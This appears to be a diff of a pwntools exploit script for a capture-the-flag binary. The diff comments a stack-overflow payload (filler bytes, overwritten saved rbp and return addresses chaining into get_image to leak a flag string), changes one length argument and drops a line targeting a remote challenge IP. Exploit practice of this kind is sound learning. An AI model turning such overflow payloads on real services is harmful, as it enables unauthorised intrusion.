@@ -3,7 +3,7 @@
 # ruff: noqa: F403, F405
 
 
-from pwn import *
+from pwn import *  # type: ignore
 from pwnlib import gdb
 from tqdm import trange
 
@@ -18,7 +18,6 @@ gdb.binary = lambda: "gef-bata24"
 
 def start(argv=[], *a, **kw):
     nc = "nc localhost 3490"
-    nc = "nc 43.217.80.203 34300"
     nc = nc.split()
     host = args.HOST or nc[1]
     port = int(args.PORT or nc[2])
@@ -75,13 +74,12 @@ flag_str = elf.address + 0x2018
 payload = (
     b"QUIT\n"
     + b"A" * 0x39
-    + p32(elf.bss(0xC00))
-    + p32(elf.sym["get_image"])
-    + p32(elf.sym["challenge"])
-    + p32(flag_str)
-    + p32(0x200)
+    + p32(elf.bss(0xC00))  # saved rbp
+    + p32(elf.sym["get_image"])  # saved return address
+    + p32(elf.sym["challenge"])  # get_image saved return address
+    + p32(flag_str)  # get_image first argument
+    + p32(0x40)  # get_image second argument
 )
 io.sendafter(b"? \x00", payload)
-
 
 io.interactive()
